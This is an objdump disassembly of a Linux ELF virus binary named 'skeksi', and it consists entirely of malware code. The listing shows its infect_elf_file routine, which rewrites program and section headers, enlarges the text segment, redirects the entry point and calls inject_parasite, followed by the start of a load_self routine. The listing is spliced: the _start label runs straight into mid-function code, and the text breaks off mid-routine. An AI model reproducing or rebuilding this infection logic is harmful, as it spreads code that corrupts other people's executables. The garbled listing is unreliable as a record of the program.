
skeksi.elf:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  400804:	48 89 b5 00 ff ff ff 	mov    QWORD PTR [rbp-0x100],rsi
  40080b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  400812:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400819:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  40081d:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  400821:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400828:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  40082c:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  400830:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400834:	48 25 00 f0 ff ff    	and    rax,0xfffffffffffff000
  40083a:	48 05 00 10 00 00    	add    rax,0x1000
  400840:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  400844:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  40084b:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40084f:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  400853:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400857:	48 83 c0 09          	add    rax,0x9
  40085b:	c7 00 25 5d 01 00    	mov    DWORD PTR [rax],0x15d25
  400861:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400868:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40086b:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  40086f:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400876:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  40087a:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  40087e:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400885:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400889:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  40088d:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400891:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  400895:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  400899:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40089d:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  4008a1:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4008a5:	48 01 c2             	add    rdx,rax
  4008a8:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4008ac:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  4008b0:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4008b4:	48 83 c0 38          	add    rax,0x38
  4008b8:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4008bc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4008c0:	48 83 c0 38          	add    rax,0x38
  4008c4:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  4008c8:	48 01 ca             	add    rdx,rcx
  4008cb:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  4008cf:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  4008d6:	e9 ec 02 00 00       	jmp    400bc7 <infect_elf_file+0x3d9>
  4008db:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  4008df:	74 4b                	je     40092c <infect_elf_file+0x13e>
  4008e1:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4008e4:	48 63 d0             	movsxd rdx,eax
  4008e7:	48 89 d0             	mov    rax,rdx
  4008ea:	48 c1 e0 03          	shl    rax,0x3
  4008ee:	48 29 d0             	sub    rax,rdx
  4008f1:	48 c1 e0 03          	shl    rax,0x3
  4008f5:	48 89 c2             	mov    rdx,rax
  4008f8:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4008fc:	48 01 d0             	add    rax,rdx
  4008ff:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  400903:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400906:	48 63 d0             	movsxd rdx,eax
  400909:	48 89 d0             	mov    rax,rdx
  40090c:	48 c1 e0 03          	shl    rax,0x3
  400910:	48 29 d0             	sub    rax,rdx
  400913:	48 c1 e0 03          	shl    rax,0x3
  400917:	48 89 c2             	mov    rdx,rax
  40091a:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40091e:	48 01 d0             	add    rax,rdx
  400921:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400925:	48 01 ca             	add    rdx,rcx
  400928:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  40092c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40092f:	48 63 d0             	movsxd rdx,eax
  400932:	48 89 d0             	mov    rax,rdx
  400935:	48 c1 e0 03          	shl    rax,0x3
  400939:	48 29 d0             	sub    rax,rdx
  40093c:	48 c1 e0 03          	shl    rax,0x3
  400940:	48 89 c2             	mov    rdx,rax
  400943:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400947:	48 01 d0             	add    rax,rdx
  40094a:	8b 00                	mov    eax,DWORD PTR [rax]
  40094c:	83 f8 01             	cmp    eax,0x1
  40094f:	0f 85 d4 01 00 00    	jne    400b29 <infect_elf_file+0x33b>
  400955:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400958:	48 63 d0             	movsxd rdx,eax
  40095b:	48 89 d0             	mov    rax,rdx
  40095e:	48 c1 e0 03          	shl    rax,0x3
  400962:	48 29 d0             	sub    rax,rdx
  400965:	48 c1 e0 03          	shl    rax,0x3
  400969:	48 89 c2             	mov    rdx,rax
  40096c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400970:	48 01 d0             	add    rax,rdx
  400973:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  400976:	83 f8 05             	cmp    eax,0x5
  400979:	0f 85 aa 01 00 00    	jne    400b29 <infect_elf_file+0x33b>
  40097f:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400982:	48 63 d0             	movsxd rdx,eax
  400985:	48 89 d0             	mov    rax,rdx
  400988:	48 c1 e0 03          	shl    rax,0x3
  40098c:	48 29 d0             	sub    rax,rdx
  40098f:	48 c1 e0 03          	shl    rax,0x3
  400993:	48 89 c2             	mov    rdx,rax
  400996:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40099a:	48 01 d0             	add    rax,rdx
  40099d:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  4009a1:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  4009a5:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009a8:	48 63 d0             	movsxd rdx,eax
  4009ab:	48 89 d0             	mov    rax,rdx
  4009ae:	48 c1 e0 03          	shl    rax,0x3
  4009b2:	48 29 d0             	sub    rax,rdx
  4009b5:	48 c1 e0 03          	shl    rax,0x3
  4009b9:	48 89 c2             	mov    rdx,rax
  4009bc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009c0:	48 01 d0             	add    rax,rdx
  4009c3:	48 8b 48 10          	mov    rcx,QWORD PTR [rax+0x10]
  4009c7:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009ca:	48 63 d0             	movsxd rdx,eax
  4009cd:	48 89 d0             	mov    rax,rdx
  4009d0:	48 c1 e0 03          	shl    rax,0x3
  4009d4:	48 29 d0             	sub    rax,rdx
  4009d7:	48 c1 e0 03          	shl    rax,0x3
  4009db:	48 89 c2             	mov    rdx,rax
  4009de:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009e2:	48 01 c2             	add    rdx,rax
  4009e5:	48 89 c8             	mov    rax,rcx
  4009e8:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  4009ec:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  4009f0:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009f3:	48 63 d0             	movsxd rdx,eax
  4009f6:	48 89 d0             	mov    rax,rdx
  4009f9:	48 c1 e0 03          	shl    rax,0x3
  4009fd:	48 29 d0             	sub    rax,rdx
  400a00:	48 c1 e0 03          	shl    rax,0x3
  400a04:	48 89 c2             	mov    rdx,rax
  400a07:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a0b:	48 01 d0             	add    rax,rdx
  400a0e:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400a12:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a15:	48 63 d0             	movsxd rdx,eax
  400a18:	48 89 d0             	mov    rax,rdx
  400a1b:	48 c1 e0 03          	shl    rax,0x3
  400a1f:	48 29 d0             	sub    rax,rdx
  400a22:	48 c1 e0 03          	shl    rax,0x3
  400a26:	48 89 c2             	mov    rdx,rax
  400a29:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a2d:	48 01 c2             	add    rdx,rax
  400a30:	48 89 c8             	mov    rax,rcx
  400a33:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400a37:	48 89 42 18          	mov    QWORD PTR [rdx+0x18],rax
  400a3b:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a3e:	48 63 d0             	movsxd rdx,eax
  400a41:	48 89 d0             	mov    rax,rdx
  400a44:	48 c1 e0 03          	shl    rax,0x3
  400a48:	48 29 d0             	sub    rax,rdx
  400a4b:	48 c1 e0 03          	shl    rax,0x3
  400a4f:	48 89 c2             	mov    rdx,rax
  400a52:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a56:	48 01 d0             	add    rax,rdx
  400a59:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400a5d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a60:	48 63 d0             	movsxd rdx,eax
  400a63:	48 89 d0             	mov    rax,rdx
  400a66:	48 c1 e0 03          	shl    rax,0x3
  400a6a:	48 29 d0             	sub    rax,rdx
  400a6d:	48 c1 e0 03          	shl    rax,0x3
  400a71:	48 89 c2             	mov    rdx,rax
  400a74:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a78:	48 01 d0             	add    rax,rdx
  400a7b:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400a7f:	48 01 ca             	add    rdx,rcx
  400a82:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400a86:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a89:	48 63 d0             	movsxd rdx,eax
  400a8c:	48 89 d0             	mov    rax,rdx
  400a8f:	48 c1 e0 03          	shl    rax,0x3
  400a93:	48 29 d0             	sub    rax,rdx
  400a96:	48 c1 e0 03          	shl    rax,0x3
  400a9a:	48 89 c2             	mov    rdx,rax
  400a9d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400aa1:	48 01 d0             	add    rax,rdx
  400aa4:	48 8b 48 28          	mov    rcx,QWORD PTR [rax+0x28]
  400aa8:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400aab:	48 63 d0             	movsxd rdx,eax
  400aae:	48 89 d0             	mov    rax,rdx
  400ab1:	48 c1 e0 03          	shl    rax,0x3
  400ab5:	48 29 d0             	sub    rax,rdx
  400ab8:	48 c1 e0 03          	shl    rax,0x3
  400abc:	48 89 c2             	mov    rdx,rax
  400abf:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400ac3:	48 01 d0             	add    rax,rdx
  400ac6:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400aca:	48 01 ca             	add    rdx,rcx
  400acd:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400ad1:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ad4:	48 63 d0             	movsxd rdx,eax
  400ad7:	48 89 d0             	mov    rax,rdx
  400ada:	48 c1 e0 03          	shl    rax,0x3
  400ade:	48 29 d0             	sub    rax,rdx
  400ae1:	48 c1 e0 03          	shl    rax,0x3
  400ae5:	48 89 c2             	mov    rdx,rax
  400ae8:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400aec:	48 01 d0             	add    rax,rdx
  400aef:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400af6:	00 
  400af7:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400afa:	48 63 d0             	movsxd rdx,eax
  400afd:	48 89 d0             	mov    rax,rdx
  400b00:	48 c1 e0 03          	shl    rax,0x3
  400b04:	48 29 d0             	sub    rax,rdx
  400b07:	48 c1 e0 03          	shl    rax,0x3
  400b0b:	48 89 c2             	mov    rdx,rax
  400b0e:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b12:	48 01 d0             	add    rax,rdx
  400b15:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400b19:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400b1d:	c7 45 fc 01 00 00 00 	mov    DWORD PTR [rbp-0x4],0x1
  400b24:	e9 9a 00 00 00       	jmp    400bc3 <infect_elf_file+0x3d5>
  400b29:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b2c:	48 63 d0             	movsxd rdx,eax
  400b2f:	48 89 d0             	mov    rax,rdx
  400b32:	48 c1 e0 03          	shl    rax,0x3
  400b36:	48 29 d0             	sub    rax,rdx
  400b39:	48 c1 e0 03          	shl    rax,0x3
  400b3d:	48 89 c2             	mov    rdx,rax
  400b40:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b44:	48 01 d0             	add    rax,rdx
  400b47:	8b 00                	mov    eax,DWORD PTR [rax]
  400b49:	83 f8 01             	cmp    eax,0x1
  400b4c:	75 75                	jne    400bc3 <infect_elf_file+0x3d5>
  400b4e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b51:	48 63 d0             	movsxd rdx,eax
  400b54:	48 89 d0             	mov    rax,rdx
  400b57:	48 c1 e0 03          	shl    rax,0x3
  400b5b:	48 29 d0             	sub    rax,rdx
  400b5e:	48 c1 e0 03          	shl    rax,0x3
  400b62:	48 89 c2             	mov    rdx,rax
  400b65:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b69:	48 01 d0             	add    rax,rdx
  400b6c:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  400b70:	48 85 c0             	test   rax,rax
  400b73:	74 4e                	je     400bc3 <infect_elf_file+0x3d5>
  400b75:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b78:	48 63 d0             	movsxd rdx,eax
  400b7b:	48 89 d0             	mov    rax,rdx
  400b7e:	48 c1 e0 03          	shl    rax,0x3
  400b82:	48 29 d0             	sub    rax,rdx
  400b85:	48 c1 e0 03          	shl    rax,0x3
  400b89:	48 89 c2             	mov    rdx,rax
  400b8c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b90:	48 01 d0             	add    rax,rdx
  400b93:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  400b96:	83 e0 02             	and    eax,0x2
  400b99:	85 c0                	test   eax,eax
  400b9b:	74 26                	je     400bc3 <infect_elf_file+0x3d5>
  400b9d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ba0:	48 63 d0             	movsxd rdx,eax
  400ba3:	48 89 d0             	mov    rax,rdx
  400ba6:	48 c1 e0 03          	shl    rax,0x3
  400baa:	48 29 d0             	sub    rax,rdx
  400bad:	48 c1 e0 03          	shl    rax,0x3
  400bb1:	48 89 c2             	mov    rdx,rax
  400bb4:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bb8:	48 01 d0             	add    rax,rdx
  400bbb:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400bc2:	00 
  400bc3:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400bc7:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400bcb:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  400bcf:	0f b7 c0             	movzx  eax,ax
  400bd2:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400bd5:	0f 8c 00 fd ff ff    	jl     4008db <infect_elf_file+0xed>
  400bdb:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  400bdf:	75 0c                	jne    400bed <infect_elf_file+0x3ff>
  400be1:	48 c7 c0 ff ff ff ff 	mov    rax,0xffffffffffffffff
  400be8:	e9 e3 01 00 00       	jmp    400dd0 <infect_elf_file+0x5e2>
  400bed:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400bf1:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400bf5:	48 8d 50 40          	lea    rdx,[rax+0x40]
  400bf9:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400bfd:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400c01:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400c05:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400c09:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400c0d:	48 01 d0             	add    rax,rdx
  400c10:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  400c14:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400c18:	0f b7 40 3e          	movzx  eax,WORD PTR [rax+0x3e]
  400c1c:	0f b7 c0             	movzx  eax,ax
  400c1f:	48 c1 e0 06          	shl    rax,0x6
  400c23:	48 89 c2             	mov    rdx,rax
  400c26:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400c2a:	48 01 d0             	add    rax,rdx
  400c2d:	48 8b 50 18          	mov    rdx,QWORD PTR [rax+0x18]
  400c31:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400c35:	48 01 d0             	add    rax,rdx
  400c38:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  400c3c:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  400c43:	e9 1d 01 00 00       	jmp    400d65 <infect_elf_file+0x577>
  400c48:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c4b:	48 98                	cdqe   
  400c4d:	48 c1 e0 06          	shl    rax,0x6
  400c51:	48 89 c2             	mov    rdx,rax
  400c54:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400c58:	48 01 d0             	add    rax,rdx
  400c5b:	8b 00                	mov    eax,DWORD PTR [rax]
  400c5d:	89 c2                	mov    edx,eax
  400c5f:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  400c63:	48 01 d0             	add    rax,rdx
  400c66:	ba 05 00 00 00       	mov    edx,0x5
  400c6b:	48 8d 35 b0 20 00 00 	lea    rsi,[rip+0x20b0]        # 402d22 <display_skeksi+0x91>
  400c72:	48 89 c7             	mov    rdi,rax
  400c75:	e8 ab 1e 00 00       	call   402b25 <_strncmp>
  400c7a:	85 c0                	test   eax,eax
  400c7c:	0f 85 aa 00 00 00    	jne    400d2c <infect_elf_file+0x53e>
  400c82:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c85:	48 98                	cdqe   
  400c87:	48 c1 e0 06          	shl    rax,0x6
  400c8b:	48 89 c2             	mov    rdx,rax
  400c8e:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400c92:	48 01 d0             	add    rax,rdx
  400c95:	48 c7 40 18 40 00 00 	mov    QWORD PTR [rax+0x18],0x40
  400c9c:	00 
  400c9d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ca0:	48 98                	cdqe   
  400ca2:	48 c1 e0 06          	shl    rax,0x6
  400ca6:	48 89 c2             	mov    rdx,rax
  400ca9:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400cad:	48 01 c2             	add    rdx,rax
  400cb0:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400cb4:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400cb8:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400cbc:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400cbf:	48 98                	cdqe   
  400cc1:	48 c1 e0 06          	shl    rax,0x6
  400cc5:	48 89 c2             	mov    rdx,rax
  400cc8:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400ccc:	48 01 d0             	add    rax,rdx
  400ccf:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  400cd3:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400cd6:	48 98                	cdqe   
  400cd8:	48 c1 e0 06          	shl    rax,0x6
  400cdc:	48 89 c1             	mov    rcx,rax
  400cdf:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400ce3:	48 01 c8             	add    rax,rcx
  400ce6:	48 83 c2 40          	add    rdx,0x40
  400cea:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  400cee:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400cf1:	48 98                	cdqe   
  400cf3:	48 c1 e0 06          	shl    rax,0x6
  400cf7:	48 89 c2             	mov    rdx,rax
  400cfa:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400cfe:	48 01 d0             	add    rax,rdx
  400d01:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400d05:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400d0c:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400d10:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d13:	48 98                	cdqe   
  400d15:	48 c1 e0 06          	shl    rax,0x6
  400d19:	48 89 c6             	mov    rsi,rax
  400d1c:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d20:	48 01 f0             	add    rax,rsi
  400d23:	48 01 ca             	add    rdx,rcx
  400d26:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400d2a:	eb 35                	jmp    400d61 <infect_elf_file+0x573>
  400d2c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d2f:	48 98                	cdqe   
  400d31:	48 c1 e0 06          	shl    rax,0x6
  400d35:	48 89 c2             	mov    rdx,rax
  400d38:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d3c:	48 01 d0             	add    rax,rdx
  400d3f:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400d43:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d46:	48 98                	cdqe   
  400d48:	48 c1 e0 06          	shl    rax,0x6
  400d4c:	48 89 c2             	mov    rdx,rax
  400d4f:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d53:	48 01 d0             	add    rax,rdx
  400d56:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400d5a:	48 01 ca             	add    rdx,rcx
  400d5d:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400d61:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400d65:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400d69:	0f b7 40 3c          	movzx  eax,WORD PTR [rax+0x3c]
  400d6d:	0f b7 c0             	movzx  eax,ax
  400d70:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400d73:	0f 8c cf fe ff ff    	jl     400c48 <infect_elf_file+0x45a>
  400d79:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400d7d:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400d81:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400d85:	48 01 c2             	add    rdx,rax
  400d88:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400d8c:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400d90:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400d94:	48 8b 50 20          	mov    rdx,QWORD PTR [rax+0x20]
  400d98:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400d9c:	48 01 c2             	add    rdx,rax
  400d9f:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400da3:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400da7:	48 8b 7d a8          	mov    rdi,QWORD PTR [rbp-0x58]
  400dab:	48 8b 8d 08 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xf8]
  400db2:	48 8b 95 00 ff ff ff 	mov    rdx,QWORD PTR [rbp-0x100]
  400db9:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  400dbd:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400dc1:	49 89 f8             	mov    r8,rdi
  400dc4:	48 89 c7             	mov    rdi,rax
  400dc7:	e8 84 f7 ff ff       	call   400550 <inject_parasite>
  400dcc:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400dd0:	c9                   	leave  
  400dd1:	c3                   	ret    

0000000000400dd2 <load_self>:
  400dd2:	f3 0f 1e fa          	endbr64 
  400dd6:	55                   	push   rbp
  400dd7:	48 89 e5             	mov    rbp,rsp
  400dda:	48 83 ec 30          	sub    rsp,0x30
  400dde:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400de2:	e8 6e 1e 00 00       	call   402c55 <get_rip>
  400de7:	48 c7 c2 62 2c 40 00 	mov    rdx,0x402c62
  400dee:	48 89 d1             	mov    rcx,rdx
  400df1:	48 c7 c2 70 2c 40 00 	mov    rdx,0x402c70
  400df8:	48 29 d1             	sub    rcx,rdx
  400dfb:	48 89 ca             	mov    rdx,rcx
  400dfe:	48 29 d0             	sub    rax,rdx
  400e01:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400e05:	e8 4b 1e 00 00       	call   402c55 <get_rip>
  400e0a:	48 c7 c2 62 2c 40 00 	mov    rdx,0x402c62
  400e11:	48 89 d1             	mov    rcx,rdx
  400e14:	48 c7 c2 85 2c 40 00 	mov    rdx,0x402c85
  400e1b:	48 29 d1             	sub    rcx,rdx
  400e1e:	48 89 ca             	mov    rdx,rcx
  400e21:	48 29 d0             	sub    rax,rdx
  400e24:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400e28:	e8 28 1e 00 00       	call   402c55 <get_rip>
  400e2d:	48 c7 c2 62 2c 40 00 	mov    rdx,0x402c62
  400e34:	48 89 d1             	mov    rcx,rdx
  400e37:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  400e3e:	48 29 d1             	sub    rcx,rdx
  400e41:	48 89 ca             	mov    rdx,rcx
  400e44:	48 29 d0             	sub    rax,rdx
  400e47:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
